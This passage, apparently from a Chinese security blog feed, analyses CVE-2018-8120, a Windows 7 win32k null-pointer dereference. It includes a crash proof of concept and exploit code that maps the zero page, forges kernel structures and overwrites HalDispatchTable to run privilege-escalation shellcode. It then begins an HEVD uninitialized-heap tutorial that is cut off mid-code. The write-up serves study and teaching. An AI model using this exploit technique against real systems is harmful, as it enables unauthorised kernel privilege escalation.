参数 pwinsta 由 _GetProcessWindowStation(0) 获得</span></span><br><span class="line">      								 <span class="comment">// 参数 piiex 在 qmemcpy 函数中由 a1 拷贝得到,而 a1 是我们可控的传入参数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    UserSetLastError(<span class="number">0x78</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  UserSessionSwitchLeaveCrit();</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>SetImeInfoEx</code>函数中，我们可以看到传入的指针<code>PWINDOWSTATION</code>指向结构体<code>tagWINDOWSTATION</code>结构如下，也就是窗口站结构，其中偏移 0x14 处可以找到<code>spklList</code>，我们需要关注的点我会进行注释</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt win32k!tagWINDOWSTATION</span><br><span class="line">   +<span class="number">0x000</span> dwSessionId      : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> rpwinstaNext     : Ptr32 tagWINDOWSTATION</span><br><span class="line">   +<span class="number">0x008</span> rpdeskList       : Ptr32 tagDESKTOP</span><br><span class="line">   +<span class="number">0x00c</span> pTerm            : Ptr32 tagTERMINAL</span><br><span class="line">   +<span class="number">0x010</span> dwWSF_Flags      : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> spklList         : Ptr32 tagKL	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x018</span> ptiClipLock      : Ptr32 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x01c</span> ptiDrawingClipboard : Ptr32 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x020</span> spwndClipOpen    : Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x024</span> spwndClipViewer  : Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x028</span> spwndClipOwner   : Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x02c</span> pClipBase        : Ptr32 tagCLIP</span><br><span class="line">   +<span class="number">0x030</span> cNumClipFormats  : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> iClipSerialNumber : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> iClipSequenceNumber : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> spwndClipboardListener : Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x040</span> pGlobalAtomTable : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> luidEndSession   : _LUID</span><br><span class="line">   +<span class="number">0x04c</span> luidUser         : _LUID</span><br><span class="line">   +<span class="number">0x054</span> psidUser         : Ptr32 Void</span><br></pre></td></tr></table></figure>
<p>我们继续追溯到<code>spklList</code>指向的结构<code>tagKL</code>，可以看到是一个键盘布局对象结构体，结构体成员中我们可以看到成员<code>piiex</code>指向一个基于<code>tagIMEINFOEX</code>布局的扩展信息，而在<code>SetImeInfoEx</code>函数中，该成员作为第二个参数传入，作为内存拷贝的内容，我们还可以发现有两个很相似的指针<code>pklNext</code>和<code>pklPrev</code>负责指向布局对象的前后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt win32k!tagKL</span><br><span class="line">   +<span class="number">0x000</span> head             : _HEAD</span><br><span class="line">   +<span class="number">0x008</span> pklNext          : Ptr32 tagKL	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x00c</span> pklPrev          : Ptr32 tagKL	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x010</span> dwKL_Flags       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> hkl              : Ptr32 HKL__	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x018</span> spkf             : Ptr32 tagKBDFILE</span><br><span class="line">   +<span class="number">0x01c</span> spkfPrimary      : Ptr32 tagKBDFILE</span><br><span class="line">   +<span class="number">0x020</span> dwFontSigs       : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> iBaseCharset     : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> CodePage         : Uint2B</span><br><span class="line">   +<span class="number">0x02a</span> wchDiacritic     : Wchar</span><br><span class="line">   +<span class="number">0x02c</span> piiex            : Ptr32 tagIMEINFOEX	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x030</span> uNumTbl          : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> pspkfExtra       : Ptr32 Ptr32 tagKBDFILE</span><br><span class="line">   +<span class="number">0x038</span> dwLastKbdType    : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> dwLastKbdSubType : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> dwKLID           : Uint4B</span><br></pre></td></tr></table></figure>
<p><code>piiex</code>指向的<code>tagIMEINFOEX</code>的结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt win32k!tagIMEINFOEX</span><br><span class="line">   +<span class="number">0x000</span> hkl              : Ptr32 HKL__</span><br><span class="line">   +<span class="number">0x004</span> ImeInfo          : tagIMEINFO</span><br><span class="line">   +<span class="number">0x020</span> wszUIClass       : [<span class="number">16</span>] Wchar</span><br><span class="line">   +<span class="number">0x040</span> fdwInitConvMode  : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> fInitOpen        : Int4B</span><br><span class="line">   +<span class="number">0x048</span> fLoadFlag        : Int4B	<span class="comment">// 关注点</span></span><br><span class="line">   +<span class="number">0x04c</span> dwProdVersion    : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> dwImeWinVersion  : Uint4B</span><br><span class="line">   +<span class="number">0x054</span> wszImeDescription : [<span class="number">50</span>] Wchar</span><br><span class="line">   +<span class="number">0x0b8</span> wszImeFile       : [<span class="number">80</span>] Wchar</span><br><span class="line">   +<span class="number">0x158</span> fSysWow64Only    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x158</span> fCUASLayer       : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞复现"><a href="#0x02：漏洞复现" class="headerlink" title="0x02：漏洞复现"></a>0x02：漏洞复现</h1><p>通过上面对每个成员的分析，我们大概知道了函数之间的调用关系，这里再简单总结一下，首先当用户在R3调用<code>CreateWindowStation</code>生成一个窗口时，新建的 WindowStation 对象其偏移 0x14 位置的 spklList 字段的值默认是零，如果我们调用R0函数<code>NtUserSetImeInfoEx</code>，传入一个我们定义的 buf ，函数就会将 buf 传给 piiex 在传入 SetImeInfoEx 中，一旦调用了 SetImeInfoEx  函数，因为 spklList 字段是零，所以就会访问到零页内存，导致蓝屏，所以我们构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IM_UI_CLASS_SIZE        16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IM_FILE_SIZE            80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IM_DESC_SIZE            50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	DWORD       dwPrivateDataSize;</span><br><span class="line">	DWORD       fdwProperty;</span><br><span class="line">	DWORD       fdwConversionCaps;</span><br><span class="line">	DWORD       fdwSentenceCaps;</span><br><span class="line">	DWORD       fdwUICaps;</span><br><span class="line">	DWORD       fdwSCSCaps;</span><br><span class="line">	DWORD       fdwSelectCaps;</span><br><span class="line">&#125; tagIMEINFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	HKL         hkl;</span><br><span class="line">	tagIMEINFO  ImeInfo;</span><br><span class="line">	WCHAR       wszUIClass[IM_UI_CLASS_SIZE];</span><br><span class="line">	DWORD       fdwInitConvMode;</span><br><span class="line">	BOOL        fInitOpen;</span><br><span class="line">	BOOL        fLoadFlag;</span><br><span class="line">	DWORD       dwProdVersion;</span><br><span class="line">	DWORD       dwImeWinVersion;</span><br><span class="line">	WCHAR       wszImeDescription[IM_DESC_SIZE];</span><br><span class="line">	WCHAR       wszImeFile[IM_FILE_SIZE];</span><br><span class="line">	CHAR        fSysWow64Only : <span class="number">1</span>;</span><br><span class="line">	BYTE        fCUASLayer : <span class="number">1</span>;</span><br><span class="line">&#125; tagIMEINFOEX;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过系统调用实现NtUserSetImeInfoEx函数</span></span><br><span class="line"><span class="keyword">static</span></span><br><span class="line">BOOL</span><br><span class="line">__declspec(naked)</span><br><span class="line">NtUserSetImeInfoEx(tagIMEINFOEX* imeInfoEx)</span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123; mov eax, <span class="number">1226</span>h &#125;;</span><br><span class="line">	__asm &#123; lea edx, [esp + <span class="number">4</span>] &#125;;</span><br><span class="line">	__asm &#123; <span class="keyword">int</span> <span class="number">2</span>eh &#125;;</span><br><span class="line">	__asm &#123; ret &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 新建一个新的窗口,新建的WindowStation对象其偏移0x14位置的spklList字段的值默认是零</span></span><br><span class="line">	HWINSTA hSta = CreateWindowStation(</span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//LPCSTR                lpwinsta</span></span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//DWORD                 dwFlags</span></span><br><span class="line">		READ_CONTROL,	<span class="comment">//ACCESS_MASK           dwDesiredAccess</span></span><br><span class="line">		<span class="number">0</span>				<span class="comment">//LPSECURITY_ATTRIBUTES lpsa</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 和窗口当前进程关联起来</span></span><br><span class="line">	SetProcessWindowStation(hSta);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x4</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0x41</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// WindowStation-&gt;spklList字段为0，函数继续执行将触发0地址访问异常</span></span><br><span class="line">	NtUserSetImeInfoEx((PVOID)&amp;buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行发现果然蓝屏了，问题出在 win32k.sys</p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/5.png" alt="1565265591357"></p>
<p>我们通过蓝屏信息定位到问题地址，确实是我们前面所说的<code>SetImeInfoEx</code>函数</p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/6.png" alt="1565265882939"></p>
<h1 id="0x03：漏洞利用"><a href="#0x03：漏洞利用" class="headerlink" title="0x03：漏洞利用"></a>0x03：漏洞利用</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我们利用的思路首先可以想到因为是在win 7的环境中，我们可以在零页构造一些结构，所以我们这里首先获得并调用申请零页的函数<code>NtAllocateVirtualMemory</code>，因为内存对齐的问题我们这里申请大小的参数设置为 1 以申请到零页内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 申明函数</span></span><br><span class="line">*(FARPROC*)&amp; NtAllocateVirtualMemory = GetProcAddress(</span><br><span class="line">	GetModuleHandleW(<span class="string">L"ntdll"</span>),</span><br><span class="line">	<span class="string">"NtAllocateVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Failed to get function NtAllocateVirtualMemory!!!\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 零页申请内存</span></span><br><span class="line">PVOID Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] Started to alloc zero page"</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(</span><br><span class="line">	INVALID_HANDLE_VALUE,</span><br><span class="line">	&amp;Zero_addr,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	&amp;RegionSize,</span><br><span class="line">	MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">	PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] Failed to alloc zero page!\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZeroMemory(Zero_addr, RegionSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" =&gt; done!\n"</span>);</span><br></pre></td></tr></table></figure>
<p>申请到内存我们就需要开始思考如何进行构造，我们再详细回顾一下漏洞复现例子中的一些函数，根据前面的例子我们知道，需要使用到<code>CreateWindowStation</code>创建窗口函数，详细的调用方法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HWINSTA <span class="title">CreateWindowStationA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpwinsta,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  ACCESS_MASK           dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpsa</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>创建好窗口站对象之后我们还需要将当前进程和窗口站对应起来，需要用到 <code>SetProcessWindowStation</code> 函数将指定的窗口站分配给调用进程。这使进程能够访问窗口站中的对象，如桌面、剪贴板和全局原子。窗口站上的所有后续操作都使用授予<code>hWinSta</code>的访问权限</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetProcessWindowStation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HWINSTA hWinSta</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>最后一步就是调用<code>xxNtUserSetImeInfoEx</code>函数蓝屏，我们这里能做手脚的就是给<code>xxNtUserSetImeInfoEx</code>函数传入的参数<code>piiex</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nt4 源码</span></span><br><span class="line"><span class="function">BOOL <span class="title">NtUserSetImeInfoEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PIMEINFOEX piiex)</span></span>;</span><br></pre></td></tr></table></figure>
<p>我们在IDA中继续分析一下并粗略的构造一个思路，这里我根据结构重新注释修复了一下 IDA 反汇编的结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">stdcall <span class="title">SetImeInfoEx</span><span class="params">(DWORD *pwinsta, DWORD *piiex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  DWORD *spklList; <span class="comment">// eax</span></span><br><span class="line">  DWORD *tagKL_piiex; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">char</span>)pwinsta;</span><br><span class="line">  <span class="keyword">if</span> ( pwinsta )</span><br><span class="line">  &#123;</span><br><span class="line">    spklList = (DWORD *)pwinsta[<span class="number">5</span>];             <span class="comment">// pwinsta 指向 tagWINDOWSTATION 结构</span></span><br><span class="line">                                                <span class="comment">// pwinsta[5] == tagWINDOWSTATION-&gt;spklList</span></span><br><span class="line">    <span class="keyword">while</span> ( spklList[<span class="number">5</span>] != *piiex )             <span class="comment">// spklList 指向 tagKL 结构</span></span><br><span class="line">                                                <span class="comment">// spklList[5] == tagKL-&gt;hkl</span></span><br><span class="line">                                                <span class="comment">// tagKL-&gt;hkl == &amp;piiex 绕过第一个检验</span></span><br><span class="line">    &#123;</span><br><span class="line">      spklList = (DWORD *)spklList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">if</span> ( spklList == (DWORD *)pwinsta[<span class="number">5</span>] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tagKL_piiex = (DWORD *)spklList[<span class="number">0xB</span>];       <span class="comment">// spklList[0xB] == tagKL-&gt;piiex</span></span><br><span class="line">    <span class="keyword">if</span> ( !tagKL_piiex )                         <span class="comment">// tagKL-&gt;piiex 不能为零绕过第二个检验</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !tagKL_piiex[<span class="number">0x12</span>] )                   <span class="comment">// piiex 指向 tagIMEINFOEX 结构</span></span><br><span class="line">                                                <span class="comment">// piiex[0x12] == tagIMEINFOEX-&gt;fLoadFlag</span></span><br><span class="line">                                                <span class="comment">// 这里 tagIMEINFOEX-&gt;fLoadFlag 需要为零才能执行拷贝函数</span></span><br><span class="line">      qmemcpy(tagKL_piiex, piiex, <span class="number">0x15C</span>u);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要清楚的是，我们最后<code>SetImeInfoEx</code>中的拷贝函数会给我们带来什么作用，他会把我们传入的<code>piiex</code>拷贝到<code>tagKL-&gt;piiex</code>中，拷贝的大小是 0x15C ，我们这里其实想到的是拷贝之后去覆盖 <code>HalDispatchTable+0x4</code>的位置，然后调用<code>NtQueryIntervalProfile</code>函数提权，所以我们只需要覆盖四个字节，为了达到更精准的覆盖我们想到了 win10 中的滥用Bitmap对象达到任意地址的读和写，那么在 win 7 中我们如何运用这个手法呢?其实很简单，原理上和 win 10 相同，只是我们现在有个问题，要达到任意地址的读和写，我们必须得让<code>hManagerPrvScan0</code>指向<code>hworkerPrvScan0</code>，我们如何实现这个目标呢?聪明的你一定想到了前面的拷贝函数，让我们先粗略的构造一个利用思路：</p>
<ul>
<li>初始化申请零页内存</li>
<li>新建一个窗口并与当前线程关联</li>
<li>申请并泄露Bitmap中的PrvScan0地址</li>
<li>在零页构造结构体绕过检查实现能够调用拷贝函数</li>
<li>构造<code>xxNtUserSetImeInfoEx</code>函数的参数并调用实现<code>hManagerPrvScan0</code>指向<code>hworkerPrvScan0</code></li>
<li>将 <code>HalDispatchTable+0x4</code>内容写为shellcode的内容</li>
<li>调用<code>NtQueryIntervalProfile</code>函数运行shellcode提权</li>
</ul>
<h2 id="xxNtUserSetImeInfoEx参数构造"><a href="#xxNtUserSetImeInfoEx参数构造" class="headerlink" title="xxNtUserSetImeInfoEx参数构造"></a>xxNtUserSetImeInfoEx参数构造</h2><p>有了思路我们现在就只差时间了，慢慢的调试总能给我们一个完美的结果(吗)，我们知道<code>NtUserSetImeInfoEx</code>函数的参数是一个<code>tagIMEINFOEX</code>结构而<code>tagKL</code>则指向这个结构，根据前面IDA中的注释，我们知道我们需要绕过几个地方的检验，从检验中我们可以发现需要做手教的地方分别是<code>tagKL-&gt;hkl</code>和<code>tagKL-&gt;piiex</code>，我们的<code>tagKL-&gt;hkl</code>需要和传入的<code>piiex</code>地址一致，<code>tagKL-&gt;piiex</code>这个结构有两处检验，第一处是自己不能为空，第二处是<code>tagIMEINFOEX-&gt;fLoadFlag</code>也必须赋值，观察Bitmap的结构，我们知道 +0x2c 偏移处刚好不为零，所以我们考虑如下构造，把<code>tagKL-&gt;piiex</code>赋值为<code>pManagerPrvScan0</code>，把<code>tagKL-&gt;hkl</code>赋值为<code>pWorkerPrvScan0</code>，为了使传入的<code>piiex</code>与我们的<code>tagKL-&gt;hkl</code>相等，我们将其构造为<code>pWorkerPrvScan0</code>的结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD* faketagKL = (DWORD*)<span class="number">0x0</span>;</span><br><span class="line"><span class="comment">// 手动构造 pWorkerPrvScan0 结构</span></span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0x0</span>) =  pWorkerPrvScan0;</span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0x4</span>) =  <span class="number">0x104</span>;</span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0x8</span>) =  <span class="number">0x00001b97</span>;</span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0xC</span>) =  <span class="number">0x00000003</span>;</span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0x10</span>) = <span class="number">0x00010000</span>;</span><br><span class="line">*(DWORD*)((PBYTE)&amp; fakepiiex + <span class="number">0x18</span>) = <span class="number">0x04800200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] piiex address is : 0x%p\n"</span>, fakepiiex); <span class="comment">// pWorkerPrvScan0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] &amp;piiex address is : 0x%p\n"</span>, &amp;fakepiiex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] faketagKL address is : 0x%p\n"</span>, faketagKL);</span><br><span class="line"><span class="comment">// 绕过检验</span></span><br><span class="line">*(DWORD*)((PUCHAR)faketagKL + <span class="number">0x14</span>) = pWorkerPrvScan0;  <span class="comment">// tagKL-&gt;hkl</span></span><br><span class="line">*(DWORD*)((PUCHAR)faketagKL + <span class="number">0x2c</span>) = pManagerPrvScan0; <span class="comment">// tagKL-&gt;piiex</span></span><br><span class="line">xxNtUserSetImeInfoEx(&amp;fakepiiex); <span class="comment">// 拷贝函数实现 pManagerPrvScan0-&gt;pWorkerPrvScan0</span></span><br></pre></td></tr></table></figure>
<p>在<code>xxNtUserSetImeInfoEx</code>函数之后下断点你会发现已经实现了<code>pManagerPrvScan0-&gt;pWorkerPrvScan0</code>，这时我们就可以尽情的任意读写了</p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/7.png" alt="1565435583152"></p>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>最后提权的过程还是和以前一样，覆盖<code>HalDispatchTable+0x4</code>函数指针，然后调用<code>NtQueryIntervalProfile</code>函数达到运行shellcode的目的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">GetShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD interVal = <span class="number">0</span>;</span><br><span class="line">	DWORD32 halHooked = GetHalOffset_4();</span><br><span class="line"></span><br><span class="line">	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA(<span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryIntervalProfile"</span>);</span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">	writeOOB(halHooked, (PVOID)&amp; ShellCode, <span class="keyword">sizeof</span>(DWORD32));</span><br><span class="line">	<span class="comment">// 1. hManagerPrvScan0-&gt;hworkerPrvScan0-&gt;HalDispatchTable+0x4</span></span><br><span class="line">	<span class="comment">// 2. hManagerPrvScan0-&gt;hworkerPrvScan0-&gt;HalDispatchTable+0x4-&gt;shellcode</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行shellcode</span></span><br><span class="line">	NtQueryIntervalProfile(<span class="number">0x1234</span>, &amp;interVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终整合一下思路和代码我们就可以提权了(不要在意这盗版的win 7…)，效果如下，详细的代码参考 =&gt; <a href>这里</a></p>
<p><img src="/2019/08/17/CVE-2018-8120-Windows内核空指针解引用漏洞分析/2018-8120.gif" alt="2018-8120"></p>
<h1 id="0x04：后记"><a href="#0x04：后记" class="headerlink" title="0x04：后记"></a>0x04：后记</h1><p>这个漏洞也可以在win 7 x64下利用，后续我会考虑把64位的利用代码完善一下，思路都差不多，主要修改的地方是偏移和汇编代码的嵌入问题，这个漏洞主要是在零页的构造，如果在win 8中就很难利用，毕竟没有办法在零页申请内存</p>
<p>参考资料：</p>
<p>[+] <a href="https://www.freebuf.com/vuls/174183.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/174183.html</a></p>
<p>[+] <a href="https://xiaodaozhi.com/exploit/149.html" target="_blank" rel="noopener">https://xiaodaozhi.com/exploit/149.html</a></p>
]]></content>
      <categories>
        <category>CVE</category>
        <category>Windows Kernel</category>
        <category>Null Pointer Dereference</category>
      </categories>
      <tags>
        <tag>Null Pointer Dereference</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(7)-Uninitialized-Heap-Variable</title>
    <url>/2019/07/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-7-Uninitialized-Heap-Variable/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的最后一篇，如果你按顺序观看我之前文章并且自己调过的话，应该对各种漏洞类型在Windows 7 下的利用比较熟悉了，其他的话我放在最后说把，现在进入我所谓的最后一个专题，未初始化的堆变量利用，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="未初始化堆变量"><a href="#未初始化堆变量" class="headerlink" title="未初始化堆变量"></a>未初始化堆变量</h2><p>我们还是先用IDA分析<code>HEVD.sys</code>，找到相应的函数<code>TriggerUninitializedHeapVariable</code>，这里首先还是初始化了异常处理机制，验证我们传入的<code>UserBuffer</code>是否在 user mode ，然后申请了一块分页池，将我们的<code>UserBuffer</code>给了<code>UserValue</code>，判断是否等于 0xBAD0B0B0 ，如果相等则给回调函数之类的赋值，如果不相等则直接调用回调函数，根据前一篇的经验，这里肯定是修改回调函数为我们shellcode的位置，最后调用提权</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerUninitializedHeapVariable</span><span class="params">(<span class="keyword">void</span> *UserBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> UserValue; <span class="comment">// esi</span></span><br><span class="line">  _UNINITIALIZED_HEAP_VARIABLE *UninitializedHeapVariable; <span class="comment">// [esp+18h] [ebp-1Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+1Ch] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0xF0</span>u, <span class="number">4u</span>);</span><br><span class="line">  UninitializedHeapVariable = (_UNINITIALIZED_HEAP_VARIABLE *)ExAllocatePoolWithTag(PagedPool, <span class="number">0xF0</span>u, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( UninitializedHeapVariable )</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, <span class="string">"'kcaH'"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Type: %s\n"</span>, <span class="string">"PagedPool"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Size: 0x%X\n"</span>, <span class="number">0xF0</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, UninitializedHeapVariable);</span><br><span class="line">    UserValue = *(_DWORD *)UserBuffer;</span><br><span class="line">    DbgPrint(<span class="string">"[+] UserValue: 0x%p\n"</span>, *(_DWORD *)UserBuffer);</span><br><span class="line">    DbgPrint(<span class="string">"[+] UninitializedHeapVariable Address: 0x%p\n"</span>, &amp;UninitializedHeapVariable);</span><br><span class="line">    <span class="keyword">if</span> ( UserValue == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      UninitializedHeapVariable-&gt;Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">      UninitializedHeapVariable-&gt;Callback = (<span class="keyword">void</span> (__stdcall *)())UninitializedHeapVariableObjectCallback;</span><br><span class="line">      <span class="built_in">memset</span>(UninitializedHeapVariable-&gt;Buffer, <span class="number">0x41</span>, <span 